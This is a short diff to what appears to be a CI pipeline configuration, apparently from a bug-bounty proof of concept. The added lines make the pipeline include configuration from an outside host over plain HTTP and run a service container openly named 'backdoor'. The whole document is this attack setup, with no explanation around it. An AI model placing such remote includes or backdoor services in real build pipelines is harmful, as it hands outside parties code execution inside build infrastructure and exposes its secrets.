@@ -1,8 +1,10 @@
+include: 
+  - remote: http://recon.offensi.com/file.yaml
 stages:
-  - test
+  - service1
 
 job:
-  stage: test
+  stage: service1
   services:
     - gcr.io/gcp-bugbounty/backdoor
   script: echo "OK"
